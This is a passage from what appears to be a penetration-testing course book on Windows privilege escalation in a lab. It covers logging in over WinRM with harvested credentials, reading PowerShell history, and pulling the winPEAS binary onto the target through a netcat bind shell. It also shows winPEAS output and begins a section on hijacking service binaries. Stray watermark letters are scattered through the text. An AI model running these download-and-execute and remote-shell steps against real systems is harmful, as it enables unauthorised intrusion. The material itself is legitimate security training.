the hash, in-memory loading, and file upload/download. However, we’ll only use it to connect to
the target system via WinRM to avoid the issues we faced by creating a PowerShell remoting
k
session in our bind shell as shown in Listing 402.
We enter the IP as argument for -i, the username for s-u, and the password for -p. We need to
escape both “!”s in the password.
o
kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
Evil-WinRM shell v3.3 n
Warning: Remote path completions is disabled due to ruby limitation:
quoting_detection_proc() functioin is unimplemented on this machine
z
Data: For more information, check Evil-WinRM Github:
https://github.com/Hackplayers/evil-winrm#Remote-path-completion
D
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\daveadmin\Documents> whoami
clientwk220\daveadmin
*Evil-WinRM* PS C:\Users\daveadmin\Documents> cd C:\
*Evil-WinRM* PS C:\> dir
Directory: C:\
Mode LastWriteTime Length Name
---- ------------- ------ ----
d----- 6/5/2021 5:10 AM PerfLogs
d-r--- 7/20/2022 1:14 AM Program Files
d-r--- 6/5/2021 7:37 AM Program Files (x86)
d----- 7/4/2022 1:00 AM tools
d-r--- 6/23/2022 8:12 AM Users
778 (Github, 2022), https://github.com/Hackplayers/evil-winrm
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 495
Made in Morocco
Penetration Testing with Kali Linux
d----- 7/20/2022 8:07 AM Windows
d----- 6/16/2022 1:17 PM xampp
Listing 403 - Using evil-winrm to connect to CLIENTWK220 as daveadmin
As Listing 403 shows, we can now execute commands without any issues. Great!
PowerShell artifacts such as the history file of PSReadline or transcript files are often a treasure
trove of valuable information. We should never skip reviewing them, because most
Administrators clear their history with Clear-History and therefore, the PSReadline history stays
untouched for us to analyze.
Administrators can prevent PSReadline from recording commands by setting the -
HistorySaveStyle option to SaveNothing with the Set-PSReadlineOption779 Cmdlet. Alternatively,
they can clear the history file manually.
In this section, we explored PowerShell Transcriptions as poweyrful mechanisms to record
commands and scripts in PowerShell. In addition, we discussed how and where PowerShell saves
its history. We used this knowledge in an example to obtain ka password for another system as
well as the password for the administrative user daveadmin.
s
16.1.5 Automated Enumeration
In the previous three sections, we manuallyo enumerated CLIENTWK220. We gathered
information, which led us to two different ways to elevate our privileges. However, this took us
quite some time to do. In a real-life penetration test for a client, we often have time constraints,
n
limiting the time we can take to enumerate systems in a manual way.
Therefore, we should use automated tools that enumerate the target machine and provide us
i
results about situational awareness as well as potential sensitive information in an easy to
z
consume fashion. One such tool is winPEAS.780
D
Automated tools can be blocked by AV solutions. If this is the case, we can apply
techniques learned in the Module “Antivirus Evasion”, try other tools such as
Seatbelt781 and JAWS,782 or do the enumeration manually.
As Kali already includes winPEAS, we can copy the 64-bit binary to our home directory and start a
Python3 web server to serve it.
kali@kali:~$ cp /usr/share/peass/winpeas/winPEASx64.exe .
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
Listing 404 - Copy WinPEAS to our home directory and start Python3 web server
779 (Microsoft Documentation, 2022), https://learn.microsoft.com/en-us/powershell/module/psreadline/set-
psreadlineoption?view=powershell-7.2
780 (Github, 2022), https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
781 (Github, 2022), https://github.com/GhostPack/Seatbelt
782 (Github, 2020), https://github.com/411Hall/JAWS
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 496
Made in Morocco
Penetration Testing with Kali Linux
Let’s connect to the bind shell running on port 4444 at CLIENTWK220 as user dave as we did
before. We start PowerShell and use the iwr783 Cmdlet with the URL of the winPEAS binary as
argument for -Uri and winPeas.exe for -Outfile.
kali@kali:~$ nc 192.168.50.220 4444
Microsoft Windows [Version 10.0.22000.318]
(c) Microsoft Corporation. All rights reserved.
C:\Users\dave> powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.
Install the latest PowerShell for new features and improvements!
https://aka.ms/PSWindows
y
PS C:\Users\dave> iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.118.3/winPEASx64.exe -Outfile winPEAS.exe
k
Listing 405 - Connect to the bind shell and transfer the WinPEAS binary to CLIENTWK220
Now, let’s run the winPEAS program. It’ll take a few minutes for the program to finish. While it is
s
running, let’s review the output legend of winPEAS. It categorizes results in different colors
indicating items worth a deeper inspection (red) and important information about protections
o
(green).
C:\Users\dave> .\winPEAS.exe
n
...
+] Legend:
Red Indiicates a special privilege over an object or something
is misconfigured
z
Green Indicates that some protection is enabled or something is
well configured
Cyan D Indicates active users
Blue Indicates disabled users
LightYellow Indicates links
Listing 406 - Output legend of winPEAS
After the program is finished, let’s review some of its findings. We begin with the basic system
information.
...
Basic System Information
...
Hostname: clientwk220
ProductName: Windows 10 Pro
EditionID: Professional
ReleaseId: 2009
BuildBranch: co_release
CurrentMajorVersionNumber: 10
CurrentVersion: 6.3
Architecture: AMD64
ProcessorCount: 2
783 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-
webrequest?view=powershell-7.2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 497
Made in Morocco
Penetration Testing with Kali Linux
SystemLang: en-US
KeyboardLang: English (United States)
TimeZone: (UTC-08:00) Pacific Time (US & Canada)
IsVirtualMachine: True
Current Time: 6/23/2022 2:30:36 PM
HighIntegrity: False
PartOfDomain: False
Hotfixes:
...
Listing 407 - Basic System Information of winPEAS
Listing 407 shows that winPEAS detected the target machine as Windows 10 Pro instead of
Windows 11 as we established before. This shows that we should never blindly trust the output of
a tool.
Next, winPEAS provides information about security protections as wyell as PowerShell and NTLM
settings. One of these information sections is about transcript files.
k
...
PS default transcripts history
 Read the PS history inside these files (if any) s
...
Listing 408 - List of transcript files
o
The list of transcript files is empty, but we know that one exists in C:\Users\Public\. This is
another example of information we would have missed by relying on tool output alone without
n
incorporating manual work.
Next, let’s scroll down to the Users output section of winPEAS.
i
z
Users
...
Current user: dave D
Current groups: Domain Users, Everyone, helpdesk, Builtin\Remote Desktop Users, Users,
Batch, Console Logon, Authenticated Users, This Organization, Local account, Local,
NTLM Authentication
CLIENTWK220\Administrator(Disabled): Built-in account for administering the
computer/domain
|->Groups: Administrators
|->Password: CanChange-NotExpi-Req
CLIENTWK220\BackupAdmin
|->Groups: BackupUsers,Administrators,Users
|->Password: CanChange-NotExpi-Req
CLIENTWK220\dave: dave
|->Groups: helpdesk,Remote Desktop Users,Users
|->Password: CanChange-NotExpi-Req
CLIENTWK220\daveadmin
|->Groups: adminteam,Administrators,Remote Management Users,Users
|->Password: CanChange-NotExpi-Req
...
CLIENTWK220\steve
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 498
Made in Morocco
Penetration Testing with Kali Linux
|->Groups: helpdesk,Remote Desktop Users,Remote Management Users,Users
|->Password: CanChange-NotExpi-Req
...
Listing 409 - User information
The output lists all users and their groups in an easy to read manner. This way of displaying the
information makes it very easy for us to understand which users exist and are members of
certain groups, such as Remote Desktop Users.
Scrolling down, we’ll find information about processes, services, scheduled tasks, network
information, and installed applications.
The next area we analyze is Looking for possible password files in users homes.
...
Looking for possible password files in users homeys
...
C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
k
C:\Users\dave\AppData\Local\Packages\MicrosoftTeams_8wekyb3d8bbwe\LocalCache\Microsoft
\MSTeams\EBWebView\ZxcvbnData\3.0.0.0\passwords.txst
...
Listing 410 - Possible password foiles in home directory of dave
The list of files does not contain asdf.txt on the Desktop of dave. Again, we would have missed
this finding without any additional manual wnork or by using another tool.
Running winPEAS on CLIENTWK220 provided us with lots of information and gave us some great
i
situational awareness about the system. On the other hand, the tool incorrectly identified the
z
target as Windows 10 and missed the meeting note, PowerShell history, and transcript file, which
we used to elevate our privileges in the previous sections. However, because of the missing
findings we should not abstDain from using automated tools, but merely understand their limits.
Automated tools such as winPEAS are essential in real-life penetration tests. Outside of lab
environments, the targets often contain numerous files, configuration settings, and information to
go through. While we have only a few files in lab environments, we’ll potentially get a list of
hundreds or thousands of files to search through a single system in an assessment. With a
pending deadline for the penetration test, we would spend all of our time going through files
without employing automated tools.
In this section, we familiarized ourselves with winPEAS and how to use it. We collected
information on the target system and compared it with our manual enumeration results. While
there were some missing findings by winPEAS, the sheer amount of information resulting from its
execution demonstrates how much time we can save in order to avoid manually obtaining all this
information.
16.2 Leveraging Windows Services
This Learning Unit covers the following Learning Objectives:
• Hijack service binaries
• Hijack service DLLs
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 499
Made in Morocco
Penetration Testing with Kali Linux
• Abuse Unquoted service paths
A Windows Service784 is a long-running background executable or application managed by the
Service Control Manager785 and is similar to the concept of daemons786 on Unix systems.
Windows services can be managed by the Services snap-in, PowerShell, or the sc.exe command
line tool. Windows uses the LocalSystem (includes the SIDs of NT AUTHORITY\SYSTEM and
BUILTIN\Administrators in its token), Network Service, and Local Service user accounts to run its
own services. Users or programs creating a service can choose either one of those accounts, a
domain user, or a local user.
Windows services are one of the main areas to analyze when searching for privilege escalation
vectors. In this Learning Unit, we’ll review three different ways to elevate our privileges by abusing
services.
16.2.1 Service Binary Hijacking y
Each Windows service has an associated binary file. These binary files are executed when the
k
service is started or transitioned into a running state.
For this section, let’s consider a scenario in which a sosftware developer creates a program and
installs an application as a Windows service. During the installation, the developer does not
secure the permissions of the program, allowing full Read and Write access to all members of the
o
Users group. As a result, a lower-privileged user could replace the program with a malicious one.
To execute the replaced binary, the user can restart the service or, in case the service is
configured to start automatically, reboot thne machine. Once the service is restarted, the malicious
binary will be executed with the privileges of the service, such as LocalSystem.
We begin by connecting to CiLIENTWK220 as dave over RDP with the password
qwertqwertqwert123. For the purzpose of this example, let’s assume the vectors to elevate our
privileges from the previous Learning Unit are out of scope.
D
To get a list of all installed Windows services, we can choose various methods such as the GUI
snap-in services.msc, the Get-Service Cmdlet, or the Get-CimInstance Cmdlet (superseding Get-
WmiObject).
Once connected, we start PowerShell and choose Get-CimInstance to query the WMI class
win32_service.787 We are interested in the name, state, and path of the binaries for each service
and therefore, use Select with the arguments Name, State, and PathName. In addition, we filter
out any services that are not in a Running state by using Where-Object.788
784 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-
windows-service-applications
785 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager
786 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Daemon_(computing)
787 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes
788 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-
object?view=powershell-7.2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 500
Made in Morocco
Penetration Testing with Kali Linux
When using a network logon such as WinRM or a bind shell, Get-CimInstance
and Get-Service will result in a “permission denied” error when querying for
services with a non-administrative user. Using an interactive logon such as RDP
solves this problem.
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select
Name,State,PathName | Where-Object {$_.State -like 'Running'}
Name State PathName
---- ----- --------
Apache2.4 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc Running C:\Windows\system32\svchosty.exe -k wsappx -p
AudioEndpointBuilder Running C:\Windows\System32\svchost.exe -k
LocalSystemNetworkRestricted -p
k
Audiosrv Running C:\Windows\System32\svchost.exe -k
LocalServiceNetworkRestricted -p
BFE Running C:\Windows\system32\svchost.exe -k
s
LocalServiceNoNetworkFirewall -p
BITS Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure Running C:\Windows\osystem32\svchost.exe -k DcomLaunch -p
...
mysql Running C:\xampp\mysql\bin\mysqld.exe --defaults-
file=c:\xampp\mysql\bin\my.ini mysql n
...